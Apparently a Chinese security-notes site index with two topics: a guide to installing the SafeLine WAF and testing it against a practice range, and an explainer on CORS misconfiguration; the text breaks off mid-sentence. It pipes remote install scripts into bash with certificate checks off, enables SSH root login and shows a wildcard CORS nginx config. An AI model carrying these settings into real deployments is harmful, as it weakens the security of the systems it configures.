{"./":{"url":"./","title":"Security Book","keywords":"","body":"Readme Web Book Redteam Book Email Book Network Book Other Book Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-15 09:45:11 "},"web/a-readme.html":{"url":"web/a-readme.html","title":"Web","keywords":"","body":"关于 Web 的知识合集~ Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 19:29:59 "},"web/Chaitin SafeLine 雷池社区版.html":{"url":"web/Chaitin SafeLine 雷池社区版.html","title":"Chaitin SafeLine 雷池社区版","keywords":"","body":"0x01 介绍 一款简单、好用的 WAF 工具。基于长亭科技王牌的 🤖️ 智能语义分析算法 🤖️ 打造，专为社区设计。 官方文档： https://github.com/chaitin/safeline/blob/main/README_CN.md https://stack.chaitin.com/tool/detail?id=717 https://waf-ce.chaitin.cn/posts/faq_install FAQ 总之就一个字，牛 🐐 两个字，好用 🦸 社区版和企业版对比 0x02 安装和使用 环境准备 & 安装 Ubuntu 安装 SSH # 安装 sudo apt update sudo apt install openssh-server # 查看运行状态 sudo systemctl status ssh or ps -e | grep ssh # 关闭 ssh sudo systemctl disable --now ssh # 开启 ssh sudo systemctl enable --now ssh # 新版 Ubuntu 还需要开启 root 登录 sudo vim /etc/ssh/sshd_config 1. 找到下面这一行 PermitRootLogin prohibit-password 2. 取消注释并将上面的 prohibit-password 替换成 yes，或者重新写一行 #PermitRootLogin prohibit-password PermitRootLogin yes # 这是新添加的一行 3. 重启sshd.service sudo systemctl restart sshd.service or service sshd restart # Ubuntu 自带一个配置防火墙配置工具，称为 UFW # 如果防火墙在你的系统上被启用，请确保打开了 SSH 端口 # 允许 ssh 连接 sudo ufw allow ssh # 可以通过 help 查看操作 root@root-docker:~# ufw -help Docker & Docker Compose https://docs.docker.com/engine/install/ https://docs.docker.com/compose/install/ https://docs.docker.com/engine/install/ubuntu/#set-up-the-repository -- 官方文档就是牛 无法正常停止 docker 进程 https://stackoverflow.com/questions/51729836/error-response-from-daemon-cannot-stop-container-signaling-init-process-cause 使用 apt 存储库安装 在新主机上首次安装 Docker Engine 之前，您需要设置 Docker 存储库。之后，您可以从存储库安装和更新 Docker。 设置存储库 更新 apt​ ​包索引并安装包以允许 apt​ ​通过 HTTPS 使用存储库： $ sudo apt-get update $ sudo apt-get install ca-certificates curl gnupg 添加 Docker 的官方 GPG 密钥： $ sudo install -m 0755 -d /etc/apt/keyrings $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg $ sudo chmod a+r /etc/apt/keyrings/docker.gpg 使用以下命令设置存储库： $ echo \\ \"deb [arch=\"$(dpkg --print-architecture)\" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ \"$(. /etc/os-release && echo \"$VERSION_CODENAME\")\" stable\" | \\ sudo tee /etc/apt/sources.list.d/docker.list > /dev/null 安装 Docker 引擎 更新 apt​​ ​包索引： $ sudo apt-get update 安装 Docker Engine、containerd 和 Docker Compose。 要安装最新版本，请运行： $ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin 要安装特定版本的 Docker Engine，首先在存储库中列出可用版本： # List the available versions: $ apt-cache madison docker-ce | awk '{ print $3 }' 5:23.0.5-1~ubuntu.22.04~jammy 5:23.0.4-1~ubuntu.22.04~jammy 选择所需版本并安装： VERSION_STRING=5:23.0.5-1~ubuntu.22.04~jammy sudo apt-get install docker-ce=$VERSION_STRING docker-ce-cli=$VERSION_STRING containerd.io docker-buildx-plugin docker-compose-plugin 通过运行映像验证 Docker 引擎安装是否成功 hello-world​​​。 $ sudo docker run hello-world 此命令下载测试图像并在容器中运行它。当容器运行时，它会打印一条确认消息并退出。 您现在已经成功安装并启动了 Docker 引擎。 卸载 Docker 引擎 卸载 Docker Engine、CLI、containerd 和 Docker Compose 包： $ sudo apt-get purge docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras 主机上的图像、容器、卷或自定义配置文件不会自动删除。删除所有镜像、容器和卷： $ sudo rm -rf /var/lib/docker $ sudo rm -rf /var/lib/containerd 您必须手动删除任何已编辑的配置文件。 # 设置开机启动 systemctl enable docker # 查看版本 docker compose version Docker Compose version vN.N.N # 手动指定版本 Docker-compose 安装 sudo curl -L \"https://github.com/docker/compose/releases/download/xxxx 版本号/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version 停止所有容器 docker stop $(docker ps -a -q) 停止 docker socket sudo systemctl stop docker.socket sudo systemctl stop docker.service 启动 docker 服务 sudo systemctl daemon-reload sudo systemctl restart docker.service SafeLine 安装 # docker info # >= 20.10.6 # docker compose version # >= 2.0.0 root@root-docker:~# docker -v Docker version 24.0.0, build 98fdcd7 root@root-docker:~# docker compose version Docker Compose version v2.17.3 ======== mkdir -p safeline && cd safeline # setup curl -kfLsS https://waf-ce.chaitin.cn/release/latest/setup.sh | bash # launch sudo docker compose up -d 突出一个丝滑，快速。 root@root-docker:/home# mkdir -p safeline && cd safeline root@root-docker:/home/safeline# curl -kfLsS https://waf-ce.chaitin.cn/release/latest/setup.sh | bash ____ __ _ _ / ___| __ _ / _| ___ | | (_) _ __ ___ \\___ \\ / _` | | |_ / _ \\ | | | | | '_ \\ / _ \\ ___) | | (_| | | _| | __/ | |___ | | | | | | | __/ |____/ \\__,_| |_| \\___| |_____| |_| |_| |_| \\___| --2023-05-17 13:41:50-- https://waf-ce.chaitin.cn/release/latest/compose.yaml 正在解析主机 waf-ce.chaitin.cn (waf-ce.chaitin.cn)... 101.200.136.115 正在连接 waf-ce.chaitin.cn (waf-ce.chaitin.cn)|101.200.136.115|:443... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度： 3082 (3.0K) [application/octet-stream] 正在保存至: “compose.yaml” compose.yaml 100%[==========================================================>] 3.01K --.-KB/s 用时 0s 2023-05-17 13:41:51 (717 MB/s) - 已保存 “compose.yaml” [3082/3082]) Setup success! Run 'docker compose up -d' to start SafeLine. And then visit https://:9443. root@root-docker:/home/safeline# sudo docker compose up -d [+] Running 36/36ers [⠀⠀] 0B/0B Pulling 1236.4s ✔ detector 2 layers [⣿⣿] 0B/0B Pulled 1465.2s ✔ 2c28d2c9e7bf Pull complete 1227.1s ✔ 556abd9ab8cb Pull complete 1447.0s ✔ mario 2 layers [⣿⣿] 0B/0B Pulled 1154.1s ...... 安装完成之后，浏览器打开后台管理页面 https://:9443​​。根据界面提示，使用 支持 TOTP 的认证软件 扫描二维码，然后输入动态口令登录。 root@root-docker:/home/safeline# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 0645a436cc64 postgres:15.2 \"docker-entrypoint.s…\" 33 minutes ago Up 33 minutes 5432/tcp safeline-postgres 4233d84592f1 chaitin/safeline-mario:latest \"/mario/entrypoint.sh\" 33 minutes ago Up 33 minutes (healthy) safeline-mario 28059557bc1a chaitin/safeline-mgt-api:latest \"/app/entrypoint.sh\" 33 minutes ago Up 33 minutes (healthy) 0.0.0.0:9443->1443/tcp, :::9443->1443/tcp safeline-mgt-api a5bf6b4a8e37 chaitin/safeline-tengine:latest \"docker-entrypoint.s…\" 33 minutes ago Up 33 minutes (healthy) safeline-tengine a2c215f38371 chaitin/safeline-detector:latest \"/detector/entrypoin…\" 33 minutes ago Up 33 minutes (healthy) 8000-8001/tcp safeline-detector SafeLine 更新 自动更新 WARN: SafeLine will be restarted and your traffic will be unavailable for a short period of time. You may need to choose a proper time for upgration. curl -kfLsS https://waf-ce.chaitin.cn/release/latest/upgrade.sh | bash # replace with `docker-compose` if necessary. docker compose down && docker compose pull && docker compose up -d 有部分环境的默认 SafeLine 安装路径是在 /data/safeline-ce​​，安装之后可能会发现需要重新绑定 OTP、配置丢失等情况，可以修改 .env 的 SAFELINE_DIR​​ 变量，指向 /data/safeline-ce​​ 手动更新镜像 适用于 docker hub 拉取镜像失败的场景，手动更新镜像，注意还是要执行 upgrade.sh​​ 来处理 .env​​ 的更新，否则有可能会因为缺少参数而启动失败。 在一台能够从 docker hub 拉取镜像的机器上执行 # 拉取镜像 docker pull chaitin/safeline-tengine:latest docker pull chaitin/safeline-mgt-api:latest docker pull chaitin/safeline-mario:latest docker pull chaitin/safeline-detector:latest docker pull postgres:15.2 # 打包镜像 docker save -o image.tar chaitin/safeline-tengine:latest chaitin/safeline-mgt-api:latest chaitin/safeline-mario:latest chaitin/safeline-detector:latest postgres:15.2 # 传输到 SafeLine 要部署的目标服务器 # scp image.tar :/root/ 在目标服务器 load 镜像 docker load -i image.tar curl -kfLsS https://waf-ce.chaitin.cn/release/latest/upgrade.sh | bash 配置国内镜像加速 Error response from daemon: Head \"https://registry-1.docker.io/v2/chaitin/safeline-detector/manifests/latest\": net/http: TLS handshake timeout 根据官方 FAQ：docker hub 默认使用位于美西节点拉取镜像，可以自行配置国内镜像加速源。 docker 安装后默认没有 daemon.json 这个配置文件，需要进行手动创建。配置文件的默认路径：/etc/docker/daemon.json​​ 标准格式为： ​$ docker pull registry.docker-cn.com/myname/myrepo:mytag​​ 例： ​$ docker pull registry.docker-cn.com/library/ubuntu:16.04​​ 为了永久性保留更改，您可以修改 /etc/docker/daemon.json​​ 文件并添加上 registry-mirrors​​ 键值。修改保存后重启 Docker 以使配置生效。 { \"registry-mirrors\": [\"https://registry.docker-cn.com\"] } 使用 & 测试 🔥🔥🔥 Online Demo: https://demo.waf-ce.chaitin.cn:9443/ 社区版接入方式 浏览器打开后台管理页面 https://:9443。根据界面提示，使用 支持 TOTP 的认证软件 扫描二维码，然后输入动态口令登录。 pikachu 启动，开测~ 雷池的几个模块 root@refl4:/home/safeline# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES cbe79478a813 chaitin/safeline-tengine:latest \"docker-entrypoint.s…\" 10 minutes ago Up 10 minutes (healthy) safeline-tengine 146d1443c778 chaitin/safeline-mario:latest \"/mario/entrypoint.sh\" 10 minutes ago Up 10 minutes (healthy) safeline-mario 8146c10e4204 postgres:15.2 \"docker-entrypoint.s…\" 10 minutes ago Up 10 minutes 5432/tcp safeline-postgres 7758a73ccda1 chaitin/safeline-detector:latest \"/detector/entrypoin…\" 10 minutes ago Up 10 minutes (healthy) 8000-8001/tcp safeline-detector 891f1f035346 chaitin/safeline-mgt-api:latest \"/app/entrypoint.sh\" 10 minutes ago Up 10 minutes (healthy) 0.0.0.0:9443->1443/tcp, :::9443->1443/tcp safeline-mgt-api 站点配置问题 在没有 SafeLine 的时候，假设小明的域名 xiaoming.com​​ 通过 DNS 解析到自己主机 192.168.1.111​​，上面在 :8888​​ 端口监听了自己的服务（网站/博客/靶场）等等。 小明通过 http://xiaoming.com:8888​​ 或者 192.168.1.111:8888​​ 来访问自己的服务。 我该如何配置？/ 域名填什么？/ 端口怎么写？/ 上游服务器是什么？ 目前社区版 SafeLine 支持的是反向代理的方式接入站点，也就是类似于一台 nginx 服务。这时候小明需要做的就是让流量先抵达 SafeLine，然后经过 SafeLine 检测之后，再转发给自己原先的业务。 小明只需要按照如下方式创建站点即可： xiaoming.com​​ 填入页面的「域名」 ​:7777​ 填入「端口」；或者别的任意非 :8888​​ 和 :9443​​（被 SafeLine 后台管理页面占用）端口 ​http://192.168.1.111:8888​​ 填入「上游服务器」 创建之后，就可以通过 http://xiaoming.com:7777​​ 或者 192.168.1.111:7777​​ 访问自己的服务了，这时候请求到 http://xiaoming.com:7777​​ 的流量都会被 SafeLine 检测。经过 SafeLine 过滤后，安全的流量会被透传到原先的 :8888​​ 业务服务器（即上游服务器）。 【注】：直接访问 http://xiaoming.com:8888​​ 的流量，仍然不会被 SafeLine 检测，因为流量并没有经过 SafeLine，而是绕过 SafeLine 直接打到了上游服务器上。如果还不行请参看官方 FAQ 进行排查。 Emmm，流量一直没打过去。。。 # 查看日志 root@root-docker:/home/safeline# docker logs -f safeline-tengine nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] still could not bind() 最终还是没办法，重新恢复了 Ubuntu 的环境【初始环境快照很重要】，重新安装后就好了。 注意是经过雷池的流量才检测，直接访问的是不会检测的，所以访问 http://192.168.201.156:7777/pikachu/ 开测~ 可以可以，看到界面了。只能说用过的都说好，Bypass 的话暂时就不测了，没啥实力。 0x00 前人栽树 【Docker】daemon.json 的作用（八） Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-24 21:59:19 "},"web/CORS 跨域漏洞.html":{"url":"web/CORS 跨域漏洞.html","title":"CORS 跨域漏洞","keywords":"","body":"0x01 漏洞描述 概述 CORS，跨域资源共享（Cross-Origin Resource Sharing），是 H5 提供的一种机制，WEB 应用程序可以通过在 HTTP 增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。当该配置不当的时候，就导致资源被恶意操作。 当 CORS 的设置不正确时，就会带来安全问题；当响应头中的 Access-Control-Allow-Origin​​ 设置为 null​​ 或 *​​ 时，表示信任任何域，这时候就可能引入安全问题。 「你的 Request 還是有發出去的」，而且瀏覽器也「確實有收到 Response」，重點是「瀏覽器因為同源政策，不把結果傳回給你的 JavaScript」。如果沒有瀏覽器的話其實就沒有這些問題，你愛發給誰就發給誰，不管怎樣都拿得到 Response。 當瀏覽器收到 Response 之後，會先檢查 Access-Control-Allow-Origin​​​ 裡面的內容，如果裡面有包含現在這個發起 Request 的 Origin 的話，就會允許通過，讓程式順利接收到 Response。 所以，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js​​​ 对响应资源的操作。【该漏洞的测试误区，要注意同源限制策略是针对浏览器的】 测试方法 测试人员访问某个 url，将请求头中的 Origin 字段修改为任意值，结果仍然能获得正确的响应报文（这会导致误报不应该使用该测试方法），就说明有 CORS 漏洞 可以通过浏览器的控制台的 network，查看接口的请求包 response 头中 Access-Control-Allow-Origin 是否设置为 *​​ 也可以通过抓包工具，查看接口返回的 response 中是 Access-Control-Allow-Origin 是否设置为 * or null 等其他配置组合，详见下文。​​ 漏洞示例 配置 Access-Control-Allow-Origin 为 *​​ 配置 Access-Control-Allow-Origin 但是该值可控 0x02 同源及跨域 什么是同源 & 跨域 同源：协议相同 & 端口相同 & 主机（域名）相同 跨域：上述之一不同，如 网络协议不同，如 http 协议访问 https 协议 ; 端口不同，如 80 端口访问 8080 端口 ; 域名不同，如 www.test1.com 访问 www.test2.com ; 子域名不同，如 abc.test1.com 访问 def.test1.com ; 浏览器将 CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 一些应用场景 比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。 程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送 ajax 请求，请求另外一个页面的内容的时候，就会跨域。 电商网站想通过用户浏览器加载第三方快递网站的物流信息。 子站域名希望调用主站域名的用户资料接口，并将数据显示出来。 跨域的方法 https://xz.aliyun.com/t/6614 https://www.bedefended.com/papers/cors-security-guide HTML 标签 等带 src 属性的标签都可以跨域加载资源，而不受同源策略的限制。每次加载时都会由浏览器发送一次 GET 请求，通过 src 属性加载的资源，浏览器会限（0x03 CORS 详解 ）JavaScript 的权限，使其不能读写返回的内容。 常见标签 在 CSS 中，@font-face 可以引入跨域字体。 @font-face { src: url(\"http://developer.mozilla.org/@api/deki/files/2934/=VeraSeBd.ttf\"); } document.domain 同一主域不同子域之间默认不同源，但可以设置 document.domain 为相同的高级域名来使不同子域同源。 document.domain 只能向上设置更高级的域名，需要载入 iframe 来相互操作。 // 父域的运行环境是 http://localhost:9092/ // 同样在部署在同一台服务器上的不同端口的应用也是适用的 window.parentDate = { \"name\": \"hello world!\", \"age\": 18 } /** * 使用 document.domain 解决 iframe 父子模块跨域的问题 */ let parentDomain = window.location.hostname; console.log(\"domain\",parentDomain); //localhost document.domain = parentDomain; /** * 使用 document.domain 解决 iframe 父子模块跨域的问题 */ console.log(document.domain); // localhost let childDomain = document.domain; document.domain = childDomain; let parentDate = top.parentDate; console.log(\"从父域获取到的数据\",parentDate); // 此处打印数据为 // { // \"name\": \"hello world!\", // \"age\": 18 // } window.name window.name 有一个奇妙的性质，页面如果设置了 window.name，那么在不关闭页面的情况下，即使进行了页面跳转 location.href=...，这个 window.name 还是会保留。 利用 window.name 的性质，我们可以在 iframe 中加载一个跨域页面。 这个页面载入之后，让它设置自己的 window.name​​，然后再让它进行当前页面的跳转，跳转到与 iframe 外的页面同域的页面，此时 window.name​​ 是不会改变的。 这样，iframe 内外就属于同一个域了，且 window.name​​ 还是跨域的页面所设置的值。 假设我们有 3 个页面 a.com/index.html a.com/empty.html b.com/index.html （1）在 a.com/index.html​ 页面中嵌入一个 iframe，设置 src 为 b.com/index.html​（2）b.com/index.html​ 载入后，设置 window.name​，然后再使用 location.href='a.com/empty.html'​ 跳转到与 iframe 外页面同域的页面中。（3）在 a.com/index.html​ 页面中，就可以通过 $('iframe').contentWindow.name​ ​来获取 iframe 内页面 a.com/empty.html​ 的 window.name​ ​值了，而这个值正是 b.com/index.html ​设置的。 window.postMessage window.postMessage(message, targetOrgin) 方法是 html5 新引进的特性。 调用 postMessage 方法的 window 对象是指要接受消息的哪一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrgin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。 需要接收消息的 window 对象，可是通过监听自身的 message 时间来获取传过来的消息，消息内容存储在该事件对象的 data 属性中。 location.hash location.hash 方式跨域，是子框架具有修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。 详细参考：https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html#m4 a.html 欲与 b.html 跨域相互通信，通过中间页 c.html 来实现。 三个页面，不同域之间利用 iframe 的 location.hash 传值，相同域之间直接 js 访问来通信。 具体实现步骤：一开始 a.html 给 b.html 传一个 hash 值，然后 b.html 收到 hash 值后，再把 hash 值传递给 c.html，最后 c.html 将结果放到 a.html 的 hash 值中。 flash flash 有自己的一套安全策略，服务器可以通过 crossdomain.xml 文件来声明能被哪些域的 SWF 文件访问，SWF 也可以通过 API 来确定自身能被哪些域的 SWF 加载。 具体见：https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html JSON & CORS JSON with Padding，就是利用 script 标签没有跨域限制的特性，使得网页可以从其他来源域动态获取 Json 数据。JSONP 跨域请求一定需要对方的服务器支持才可以。 JSONP 实现流程： 定义一个 回调函数 handleResponse 用来接收返回的数据 function handleResponse(data) { console.log(data); }; 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse var body = document.getElementsByTagName('body')[0]; var script = document.gerElement('script'); script.src = 'http://test.com/json?callback=handleResponse'; body.appendChild(script); 通过 script.src 请求 http://test.com/json?callback=handleResponse， 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse({\"name\": \"twosmi1e\"}) 给浏览器 浏览器在接收到 handleResponse({\"name\": \"twosmi1e\"}) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。 CORS 见下文 0x03 CORS 详解 CORS 是一个 W3C 标准，全称是\"跨域资源共享\"（Cross-origin resource sharing）。CORS 的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。 它允许浏览器向跨源服务器，发出 XMLHttpRequest​​​ ​请求，从而克服了 AJAX 只能同源使用的限制 CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。 整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX​​ 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。 JSONP 只支持 GET​​ 请求，CORS 支持所有类型的 HTTP 请求。 JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。 CORS 工作流程（针对浏览器的） 请求方脚本从用户浏览器发送跨域请求。浏览器会自动在每个跨域请求中添加 Origin 头，用于声明请求方的源。 资源服务器根据请求中 Origin 头返回访问控制策略(Access-Control-Allow-Origin 响应头)，并在其中声明允许读取响应内容的源。 浏览器检查资源服务器在 Access-Control-Allow-Origin 头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许。 简单请求 只要同时满足以下两大条件，就属于简单请求。 （1）请求方法是以下三种方法之一： HEAD GET POST （2）HTTP 的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值 application/x-www-form-urlencoded​​、multipart/form-data​​、text/plain​​ 这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX​​ 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。 凡是不同时满足上面两个条件，就属于非简单请求。 浏览器对这两种请求的处理，是不一样的。 基本流程 对于简单请求，浏览器直接发出 CORS 请求。 具体来说，就是在头信息之中，增加一个 Origin​​ ​字段。 下面是一个例子，浏览器发现这次跨源 AJAX​​ 请求是简单请求，就自动在头信息之中，添加一个 Origin​​ ​字段。 GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面的头信息中，Origin​ ​字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。 如果 Origin​​ ​指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含 Access-Control-Allow-Origin​​ ​字段（详见下文），就知道出错了，从而抛出一个错误，被 XMLHttpRequest​​ ​的 onerror​​ ​回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是 200。 如果 Origin​ ​指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access_control-Allow-Method: * Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 上面的头信息之中，有三个与 CORS 请求相关的字段，都以 Access-Control-​ ​开头。 （1）Access-Control-Allow-Origin 该字段是必须的。它的值要么是请求时 Origin​​ 字段的值，要么是一个 *​​ ，表示接受任意域名的请求。 （2）Access-Control-Allow-Credentials 该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie​​。默认情况下，Cookie 不包括在 CORS 请求之中。设为 true​​​，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为 true​​​，如果服务器不要浏览器发送 Cookie，删除该字段即可。 （3）Access-Control-Expose-Headers 该字段可选。CORS 请求时，XMLHttpRequest​​ ​对象的 getResponseHeader()​​ ​方法只能拿到 6 个基本字段：Cache-Control​​​、Content-Language​​​、Content-Type​​​、Expires​​​、Last-Modified​​​、Pragma​​​。如果想拿到其他字段，就必须在 Access-Control-Expose-Headers​​ ​里面指定。上面的例子指定，getResponseHeader('FooBar')​​ ​可以返回 FooBar​​ ​字段的值。 （4）Access-Control-Allow-Methods​ 该字段表示允许请求的方法，比如 GET, POST, PUT, DELETE 等 ​add_header 'Access-Control-Allow-Methods' *;​​ // 表示允许任意方法 服务端的 Nginx 配置 请确保将配置行添加到 http​​ 配置块的大括号 ({}​​) 内并保存重启 Nginx。 http { include mime.types; default_type application/octet-stream; # 其他配置... # 添加下面这行配置，允许跨域请求的网站 #add_header 'Access-Control-Allow-Origin' 'http://xxx.xxx.xxx'; add_header 'Access-Control-Allow-Origin' '*'; #add_header 'Access-Control-Allow-Credential' 'true'; add_header 'Access_control-Allow-Method' '*'; # 其他配置... } withCredentials 属性 上面说到，CORS 请求默认不发送 Cookie 和 HTTP 认证信息。如果要把 Cookie 发到服务器，一方面要服务器同意，指定 Access-Control-Allow-Credentials​ ​字段。 Access-Control-Allow-Credentials: true 另一方面，开发者必须在 AJAX​​ 请求中打开 withCredentials​​ ​属性。 var xhr = new XMLHttpRequest(); xhr.withCredentials = true; 否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。 但是，如果省略 withCredentials​ ​设置，有的浏览器还是会一起发送 Cookie。这时，可以显式关闭 withCredentials​​。 xhr.withCredentials = false; 需要注意的是，如果要发送 Cookie，Access-Control-Allow-Origin​​ ​就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 document.cookie​​ ​也无法读取服务器域名下的 Cookie。 非简单请求 非简单请求是那种对服务器有特殊要求的请求，比如请求方法是 PUT​​ 或 DELETE​​，或者 Content-Type​​ 字段的类型是 application/json​​。 非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为\"预检\"请求（preflight​​）。 预检请求 浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest​ ​请求，否则就报错。 下面是一段浏览器的 JavaScript 脚本，在浏览器 consolo​​ 执行。 var url = 'http://api.alice.com/cors'; var xhr = new XMLHttpRequest(); xhr.open('PUT', url, true); xhr.setRequestHeader('X-Custom-Header', 'value'); xhr.send(); 上面代码中，HTTP 请求的方法是 PUT​​，并且发送一个自定义头信息 X-Custom-Header​​。 浏览器发现，这是一个非简单请求，就自动发出一个\"预检\"请求，要求服务器确认可以这样请求。下面是这个\"预检\"请求的 HTTP 头信息。 OPTIONS /cors HTTP/1.1 Origin: http://api.bob.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: X-Custom-Header Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... \"预检\"请求用的请求方法是 OPTIONS​​​，表示这个请求是用来询问的。头信息里面，关键字段是 Origin​​​，表示请求来自哪个源。 除了 Origin​ ​字段，\"预检\"请求的头信息包括两个特殊字段。 （1）Access-Control-Request-Method 该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 PUT​​。 （2）Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 X-Custom-Header​​​​。 为什么需要预请求？ 假設今天某個 Server 提供了一個 API 網址叫做：https://example.com/data/16​​，你只要對它發送 GET，就能夠拿到 id 是 16 的資料，只要對它發送 DELETE，就可以把這筆資料刪除。 如果今天沒有 Preflight Request 這個機制的話，我就可以在隨便一個 Domain 的網頁上面發送一個 DELETE 的 Request 給這個 API。剛剛我有強調說瀏覽器的 CORS 機制，還是會幫你發送 Request，但只是 Response 被瀏覽器擋住而已。 因此呢，儘管沒有 Response，但是 Server 端的確收到了這個 Request，因此就會把這筆資料給刪除。 如果有 Preflight Request 的話，在發送出去收到結果的時候，就會知道這個 API 並沒有提供 CORS，因此真的 DELETE 請求就不會送出，到這邊就結束了。 先用一個 OPTIONS 的請求去確認之後的 Request 能不能送出，這就是 Preflight Request 的目的。 预检请求的回应 服务器收到\"预检\"请求以后，检查了 Origin​​、Access-Control-Request-Method​ ​和 Access-Control-Request-Headers​ ​字段以后，确认允许跨源请求，就可以做出回应。 HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:15:39 GMT Server: Apache/2.0.61 (Unix) Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Content-Type: text/html; charset=utf-8 Content-Encoding: gzip Content-Length: 0 Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Content-Type: text/plain 上面的 HTTP 回应中，关键的是 Access-Control-Allow-Origin​​ ​字段，表示 http://api.bob.com​​ ​可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。 Access-Control-Allow-Origin: * 如果服务器否定了\"预检\"请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被 XMLHttpRequest​​ ​对象的 onerror​​ ​回调函数捕获。控制台会打印出如下的报错信息。 XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. 服务器回应的其他 CORS 相关字段如下。 Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000 （1）Access-Control-Allow-Methods 该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次\"预检\"请求。 （2）Access-Control-Allow-Headers 如果浏览器请求包括 Access-Control-Request-Headers​ ​字段，则 Access-Control-Allow-Headers​ ​字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在\"预检\"中请求的字段。 （3）Access-Control-Allow-Credentials 该字段与简单请求时的含义相同。 （4）Access-Control-Max-Age 该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。 浏览器的正常请求和回应 一旦服务器通过了\"预检\"请求，以后每次浏览器正常的 CORS 